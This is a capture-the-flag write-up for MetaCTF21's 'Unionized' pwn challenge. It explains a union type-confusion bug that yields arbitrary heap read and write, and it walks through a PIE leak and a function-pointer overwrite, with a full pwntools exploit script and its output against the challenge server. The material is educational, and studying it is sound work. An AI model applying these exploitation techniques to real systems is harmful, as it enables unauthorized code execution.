# Unionized

The description for this challenge is as follows:

*Why didn't anyone tell me about the magic of Unionized when I first started programming? I would have saved so much memory with these nifty things, don't you think? Here try my application and tell me what you think host.cg21.metaproblems.com:3150*

This challenge was worth 275 points, and it was solved by 27 teams. The
downloadables for the challenge included the original binary with docker
information as well as the C source code. I didn't start looking at this
challenge until fairly later in the CTF, so I ended up solving it on my own
after the competition window ended. It was reasonably straightforward once the
vulnerability was identified and an appropriate debugging environment was set
up.

**TL;DR Solution:** Realize that storing the pointers to strings in the same
spot as ints, long longs, and chars is a bad idea. If you define a string,
edit it to one of the latter data types, edit the string pointer as one of
those data types, then edit the index back to being a smaller string. Any
attempts to write to or read from that index will look at whetever address is
pointed to by your edited string pointer, which gives you an arbitrary
read/write. Find the print function pointer in the heap, read from it for a
PIE leak, then write the win function to that section of memory and get a
shell.

## Original Writeup Link

This writeup is also available on my GitHub! View it there via this link:
https://github.com/knittingirl/CTF-
Writeups/tree/main/pwn_challs/MetaCTF21/Unionized

## Environment Setup

Because of the heap offsets used in this challenge, it was very helpful to use
the same libc as the remote instance. The challenge does include Docker
information, so you could run the challenge within a docker instance, but I
personally prefer to run things on my actual machine, and I wanted to quickly
share my methodology for this if anyone feels similarly.

Firstly, I open up the Dockerfile. The top line is "FROM
debian:buster-20200803", so this is image that is being used. I pull the
image, then save it to a tar archive for easy export of files:  
```  
knittingirl@piglet:~/CTF/metaCTF21/unionized$ sudo docker pull
debian:buster-20200803  
[sudo] password for knittingirl:  
buster-20200803: Pulling from library/debian  
d6ff36c9ec48: Pull complete  
Digest:
sha256:1e74c92df240634a39d050a5e23fb18f45df30846bb222f543414da180b47a5d  
Status: Downloaded newer image for debian:buster-20200803  
docker.io/library/debian:buster-20200803  
knittingirl@piglet:~/CTF/metaCTF21/unionized$ sudo docker images  
[sudo] password for knittingirl:  
REPOSITORY                        TAG                   IMAGE ID       CREATED
SIZE  
debian                            buster-20200803       ee11c54e6bb7   16
months ago   114MB  
knittingirl@piglet:~/CTF/metaCTF21/unionized$ sudo docker save ee11c54e6bb7 >
buster_files.tar  
```  
Then within a file explorer, I go into the back-up, the only layer, and the
layer.tar file to reach the base directory of the file system. The libc and
interpreter files are in /libx86_64-linux-gnu/, and they are named
libc-2.28.so and ld-2.28.so respectively. Then I just copy them to the
directory where my unionized binary is, make sure that they each have
executable permissions, then use patchelf to set the path to my interpreter in
a copy of the binary. See commands below:  
```  
knittingirl@piglet:~/CTF/metaCTF21/unionized$ cp chall chall_patched  
knittingirl@piglet:~/CTF/metaCTF21/unionized$ patchelf chall_patched --set-
interpreter ld-2.28.so --set-rpath ./  
```  
Then I just set the LD_PRELOAD environment variable to use the libc-2.28.so
file as the libc with that patched binary. The format in pwntools to use that
environment variable is:  
```  
from pwn import *

target = process('./chall_patched', env={"LD_PRELOAD":"./libc-2.28.so"})  
```  
I hope that this makes sense and is helpful if you've been struggling with
docker environments and pwn challenges.

## Gathering Information

So, the first step, as always, is to simply run the binary and see what
happens. This shows me that I can create objects of various types, after
creation, I can edit those objects as the same or different type, I can
display object contents, and despite the appearance of the menu, I can't
actually delete anything.  
```  
knittingirl@piglet:~/CTF/metaCTF21/unionized$ ./chall  
What would you like to do?  
1. Create new object  
2. Display objects  
3. Edit Object  
4. Delete Object  
5. Exit  
1  
What type would you like?

1. String  
2. Integer  
3. Long Long  
4. Character  
1  
What size would you like your string to be  
45  
What is your data  
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa  
What would you like to do?  
1. Create new object  
2. Display objects  
3. Edit Object  
4. Delete Object  
5. Exit  
2  
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

What would you like to do?  
1. Create new object  
2. Display objects  
3. Edit Object  
4. Delete Object  
5. Exit  
3  
What index would you like to modify?  
0  
What type would you like?

1. String  
2. Integer  
3. Long Long  
4. Character  
2  
What is your value:  
87  
Variable created  
What would you like to do?  
1. Create new object  
2. Display objects  
3. Edit Object  
4. Delete Object  
5. Exit  
2  
87  
What would you like to do?  
1. Create new object  
2. Display objects  
3. Edit Object  
4. Delete Object  
5. Exit  
4  
Not implemented  
What would you like to do?  
1. Create new object  
2. Display objects  
3. Edit Object  
4. Delete Object  
5. Exit  
```  
If I run checksec on the binary, I can see that PIE is enabled, as is NX:  
```  
knittingirl@piglet:~/CTF/metaCTF21/unionized$ checksec chall  
[*] '/home/knittingirl/CTF/metaCTF21/unionized/chall'  
   Arch:     amd64-64-little  
   RELRO:    Partial RELRO  
   Stack:    No canary found  
   NX:       NX enabled  
   PIE:      PIE enabled  
```  
At this point, I am ready to start reverse engineering using the generously
provided C-source code. The created struct stands out immediately. It contains
a union with all of the types we can use, which should be relevant based on
the challenge name. It also includes a function pointer, which tends to be a
target in heap-based challenges since these pointers present an easy location
to overwrite.  
```  
struct created{  
	int type;  
	int size;

	union Variable {  
		char * string;  
		int integer;  
		long long long_boi;  
		char character;

	} variable;  
	void (*print)();  
	struct created *next;  
};  
```  
Another obvious point of interest is the win() function. I will also note that
the delete() function genuinely just does nothing aside from a puts.  
```  
void win(){  
	system("/bin/sh");  
}

void delete(){  
	puts("Not implemented");  
	return;  
}  
```  
The main exploit is a little bit harder to spot. The create_variable()
function is called by both the create() and edit() functions in order to
select an input type and input contents. If I look at the case for string
types, it checks if the currently requested string length exceeds that of any
length entered previously for this specific object at this index. If it does,
it will make a fresh, appropriately sized malloc, and the variable section of
the struct will be overwritten with the pointer to that mallocced section.
However, if the requested length is shorter, no fresh allocation will be made,
and the string will be allocated to whatever the variable pointer is pointing
to.  
```  
case 1:  
				while(1){  
					printf("What size would you like your string to be\n");  
					scanf("%d", &size);  
					if(tmp->size < size)  
					{  
						tmp->variable.string = malloc(size);  
						tmp->size = size;  
					}  
					if(!tmp->variable.string){  
						printf("Allocation failed Try again\n");  
						sleep(1);  
						continue;  
					}  
						break;  
				}  
				printf("What is your data\n");  
				read(0, tmp->variable.string, tmp->size);  
				tmp->type = 1;  
				tmp->print = display_string;  
  
				break;  
```  
Since variable is a union that can be switched to various types, this is a
very severe problem. For example, if I make object 0 a string of length 55,
then I make it an int whose value is 0x5565, then try to make object 0 a
string again, this time with length 35, it will not allocate a new spot on the
heap for my heap contents. Instead, it will try to write to the address of
0x5565; if that is not allocated memory, then we can expect a segfault. Here
is that sequence of events in practice:  
```  
knittingirl@piglet:~/CTF/metaCTF21/unionized$ ./chall  
What would you like to do?  
1. Create new object  
2. Display objects  
3. Edit Object  
4. Delete Object  
5. Exit  
1  
What type would you like?

1. String  
2. Integer  
3. Long Long  
4. Character  
1  
What size would you like your string to be  
55  
What is your data  
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa  
What would you like to do?  
1. Create new object  
2. Display objects  
3. Edit Object  
4. Delete Object  
5. Exit  
3  
What index would you like to modify?  
0  
What type would you like?

1. String  
2. Integer  
3. Long Long  
4. Character  
2  
What is your value:  
21861  
Variable created  
What would you like to do?  
1. Create new object  
2. Display objects  
3. Edit Object  
4. Delete Object  
5. Exit  
3  
What index would you like to modify?  
0  
What type would you like?

1. String  
2. Integer  
3. Long Long  
4. Character  
1  
What size would you like your string to be  
35  
What is your data  
bbbbbbbbbbbbbbbbbbbbbb  
Variable created  
What would you like to do?  
1. Create new object  
2. Display objects  
3. Edit Object  
4. Delete Object  
5. Exit  
2  
Segmentation fault  
```  
## Planning the Exploit:

This exploit presents a fairly obvious opportunity for an arbitrary write;
however, the presence of PIE as a defense means that I cannot, for instance,
simply overwrite a GOT entry with my win function, because I do not know where
the GOT is. As a result, I decided to look into a partial-overwrite strategy.
If I edit strings to chars and back again, that should only overwrite the
least-significant bit in my pointer. If I break on the create_variable
function in GDB/GEF, as called from an edit, I can see that, if I am not
overwriting anything, the string is read into a heap location as expected. In
one specific instance, it is getting read into the address 0x000055e909e09290.
If I then look at all the addresses with the same seven most significant
bytes, i.e. ones I could write to instead by overwriting the least significant
byte with a char, I see that the address for the print function pointer from
the struct definition, where the address for display_string is stored in this
case, is kept at 0x55e909e09270.  
```  
read@plt (  
  $rdi = 0x0000000000000000,  
  $rsi = 0x000055e909e09290 → "00000000000000000000",  
  $rdx = 0x0000000000000014  
)  
...  
gef➤  x/40gx 0x000055e909e09200  
0x55e909e09200: 0x0000000000000000      0x0000000000000000  
0x55e909e09210: 0x0000000000000000      0x0000000000000000  
0x55e909e09220: 0x0000000000000000      0x0000000000000000  
0x55e909e09230: 0x0000000000000000      0x0000000000000000  
0x55e909e09240: 0x0000000000000000      0x0000000000000000  
0x55e909e09250: 0x0000000000000000      0x0000000000000031  
0x55e909e09260: 0x0000001400000001      0x000055e909e09290  
0x55e909e09270: 0x000055e909de7226      0x0000000000000000  
0x55e909e09280: 0x0000000000000000      0x0000000000000021  
0x55e909e09290: 0x3030303030303030      0x3030303030303030  
0x55e909e092a0: 0x0000000030303030      0x0000000000020d61  
0x55e909e092b0: 0x0000000000000000      0x0000000000000000  
0x55e909e092c0: 0x0000000000000000      0x0000000000000000  
0x55e909e092d0: 0x0000000000000000      0x0000000000000000  
0x55e909e092e0: 0x0000000000000000      0x0000000000000000  
0x55e909e092f0: 0x0000000000000000      0x0000000000000000  
0x55e909e09300: 0x0000000000000000      0x0000000000000000  
0x55e909e09310: 0x0000000000000000      0x0000000000000000  
0x55e909e09320: 0x0000000000000000      0x0000000000000000  
0x55e909e09330: 0x0000000000000000      0x0000000000000000  
gef➤  x/i 0x000055e909de7226  
  0x55e909de7226 <display_string>:      push   rbp  
```  
If I also look at the display function, I can see that the display_string
function is called because it is the function pointed to at this heap address;
the contents of rax+10 are that heap address, those contents are loaded into
rdx, and rdx is called.  
```  
→ 0x55e909de7653 <display+32>     mov    rdx, QWORD PTR [rax+0x10]  
  0x55e909de7657 <display+36>     mov    rax, QWORD PTR [rbp-0x8]  
  0x55e909de765b <display+40>     mov    rdi, rax  
  0x55e909de765e <display+43>     mov    eax, 0x0  
  0x55e909de7663 <display+48>     call   rdx  
  0x55e909de7665 <display+50>     add    DWORD PTR [rbp-0xc], 0x1  
─────────────────────────────────────────────────────────────────── threads
────  
[#0] Id 1, Name: "chall_patched", stopped 0x55e909de7653 in display (),
reason: SINGLE STEP  
───────────────────────────────────────────────────────────────────── trace
────  
[#0] 0x55e909de7653 → display()  
[#1] 0x55e909de7769 → main()  
────────────────────────────────────────────────────────────────────────────────  
gef➤  x/gx $rax+0x10  
0x55e909e09270: 0x000055e909de7226  
gef➤  x/i win  
  0x55e909de7680 <win>: push   rbp  
```  
Here is the script so far to get these outputs:  
```  
from pwn import *

target = process('./chall_patched', env={"LD_PRELOAD":"./libc-2.28.so"})

pid = gdb.attach(target, "b *display+32\nb *create_variable+314\n set
disassembly-flavor intel\ncontinue")

#target = remote('host.cg21.metaproblems.com', 3150)

elf = ELF('chall')

def create_string(length, content):

	print(target.recvuntil(b'5. Exit'))  
	target.sendline(b'1')  
	print(target.recvuntil(b'What type would you like?'))  
	target.sendline(b'1')  
	print(target.recvuntil(b'like your string to be'))  
	target.sendline(str(length))  
	print(target.recvuntil(b'data'))  
	target.sendline(content)

def edit_char(index, character):  
	print(target.recvuntil(b'5. Exit'))  
	target.sendline(b'3')  
	print(target.recvuntil(b'What index would you like to modify'))  
	target.sendline(str(index))  
	print(target.recvuntil(b'What type would you like?'))  
	target.sendline(b'4')  
	print(target.recvuntil(b'What is your value:'))  
	target.sendline(character)

def edit_string(index, length, data):  
	print(target.recvuntil(b'5. Exit'))  
	target.sendline(b'3')

	print(target.recvuntil(b'What index would you like to modify'))  
	target.sendline(str(index))

	print(target.recvuntil(b'What type would you like?'))  
	target.sendline(b'1')

	print(target.recvuntil(b'like your string to be'))  
	target.sendline(str(length))

	print(target.recvuntil(b'data'))  
	target.sendline(data)

def display():  
	print(target.recvuntil(b'5. Exit\n'))  
	target.sendline(b'2')

create_string(20, '0' * 20)  
edit_string(0, 15, b'a' * 15)

display()

target.interactive()  
```  
At this point, I have two options for my approach. I could attempt a partial
overwrite of the print function pointer with the win function; however, the
low two bytes of the functions differ, and only the low three nibbles of win
will be known between executions, so I will have to guess one nibble for 1/16
odds of success. This is not bad, and if I did not have an alternative idea, I
would have implemented this.

However, I realized that in addition to an arbitrary write, I should be able
to get an arbitrary read. I can simply use the string to char to string method
to input a string of length zero to the heap offset that contains the
display_string address, then use the display option to read that unedited
address. I use this to get a PIE leak and find the win function's address, and
from there, I can write the win function to the print pointer, overwriting the
display_string address.

# Writing the Exploit

One final note of housekeeping is that if you want to overwrite the print
address, you do need to create a second string to char to string object and
use that to overwrite the display_string address of the first object. This is
becausse the display_string address is written to the print pointer after I
write in the contents of my string, so if I try to overwrite the print pointer
of the object I am currently editing, my efforts will be overwritten and
nothing will happen. I have since realized that since there is only partial
RELRO, I should also be able to just overwrite a GOT function like puts with
my win function and also get a shell now that I have a PIE leak.

Here is my finished script:  
```  
from pwn import *

#target = process('./chall_patched', env={"LD_PRELOAD":"./libc-2.28.so"})

#pid = gdb.attach(target, "b *display+32\nb *create_variable+314\n set
disassembly-flavor intel\ncontinue")

target = remote('host.cg21.metaproblems.com', 3150)

elf = ELF('chall')

def create_string(length, content):

	print(target.recvuntil(b'5. Exit'))  
	target.sendline(b'1')  
	print(target.recvuntil(b'What type would you like?'))  
	target.sendline(b'1')  
	print(target.recvuntil(b'like your string to be'))  
	target.sendline(str(length))  
	print(target.recvuntil(b'data'))  
	target.sendline(content)

def edit_char(index, character):  
	print(target.recvuntil(b'5. Exit'))  
	target.sendline(b'3')  
	print(target.recvuntil(b'What index would you like to modify'))  
	target.sendline(str(index))  
	print(target.recvuntil(b'What type would you like?'))  
	target.sendline(b'4')  
	print(target.recvuntil(b'What is your value:'))  
	target.sendline(character)

def edit_string(index, length, data):  
	print(target.recvuntil(b'5. Exit'))  
	target.sendline(b'3')

	print(target.recvuntil(b'What index would you like to modify'))  
	target.sendline(str(index))

	print(target.recvuntil(b'What type would you like?'))  
	target.sendline(b'1')

	print(target.recvuntil(b'like your string to be'))  
	target.sendline(str(length))

	print(target.recvuntil(b'data'))  
	target.sendline(data)

def display():  
	print(target.recvuntil(b'5. Exit\n'))  
	target.sendline(b'2')

create_string(20, '0' * 20)  
create_string(20, '1' * 20)

edit_char(0, b'\x70')  
edit_string(0, 0, b'')

display()

leak = target.recv(6)  
print(leak)  
display_string = u64(leak + b'\x00' * 2)  
print(hex(display_string))

pie_base = display_string - elf.symbols['display_string']  
win = pie_base + elf.symbols['win']  
print(hex(win))

#Round 2:

edit_char(1, b'\x70')

edit_string(1, 8, p64(win))

display()

target.interactive()  
```  
And here are the results:  
```  
knittingirl@piglet:~/CTF/metaCTF21/unionized$ python3 unionized_writeup.py  
[+] Opening connection to host.cg21.metaproblems.com on port 3150: Done  
[*] '/home/knittingirl/CTF/metaCTF21/unionized/chall'  
   Arch:     amd64-64-little  
   RELRO:    Partial RELRO  
   Stack:    No canary found  
   NX:       NX enabled  
   PIE:      PIE enabled  
b'What would you like to do?\n1. Create new object\n2. Display objects\n3.
Edit Object\n4. Delete Object\n5. Exit'  
b'\nWhat type would you like?'  
b'\n\n1. String\n2. Integer\n3. Long Long\n4. Character\nWhat size would you
like your string to be'  
b'\nWhat is your data'  
b'\nWhat would you like to do?\n1. Create new object\n2. Display objects\n3.
Edit Object\n4. Delete Object\n5. Exit'  
b'\nWhat type would you like?'  
b'\n\n1. String\n2. Integer\n3. Long Long\n4. Character\nWhat size would you
like your string to be'  
b'\nWhat is your data'  
b'\nWhat would you like to do?\n1. Create new object\n2. Display objects\n3.
Edit Object\n4. Delete Object\n5. Exit'  
b'\nWhat index would you like to modify'  
b'?\nWhat type would you like?'  
b'\n\n1. String\n2. Integer\n3. Long Long\n4. Character\nWhat is your value:'  
b'\nVariable created\nWhat would you like to do?\n1. Create new object\n2.
Display objects\n3. Edit Object\n4. Delete Object\n5. Exit'  
b'\nWhat index would you like to modify'  
b'?\nWhat type would you like?'  
b'\n\n1. String\n2. Integer\n3. Long Long\n4. Character\nWhat size would you
like your string to be'  
b'\nWhat is your data'  
b'\nVariable created\nWhat would you like to do?\n1. Create new object\n2.
Display objects\n3. Edit Object\n4. Delete Object\n5. Exit\n'  
b'&r2\x9b$V'  
0x56249b327226  
0x56249b327680  
b'\n11111111111111111111\nWhat would you like to do?\n1. Create new object\n2.
Display objects\n3. Edit Object\n4. Delete Object\n5. Exit'  
b'\nWhat index would you like to modify'  
b'?\nWhat type would you like?'  
b'\n\n1. String\n2. Integer\n3. Long Long\n4. Character\nWhat is your value:'  
b'\nVariable created\nWhat would you like to do?\n1. Create new object\n2.
Display objects\n3. Edit Object\n4. Delete Object\n5. Exit'  
b'\nWhat index would you like to modify'  
b'?\nWhat type would you like?'  
b'\n\n1. String\n2. Integer\n3. Long Long\n4. Character\nWhat size would you
like your string to be'  
b'\nWhat is your data'  
b'\nVariable created\nWhat would you like to do?\n1. Create new object\n2.
Display objects\n3. Edit Object\n4. Delete Object\n5. Exit\n'  
[*] Switching to interactive mode  
$ ls  
chall  
chall.sh  
flag.txt  
$ cat flag.txt  
MetaCTF{Unions_Can_Be_Problematic}  
```  
Thanks for reading!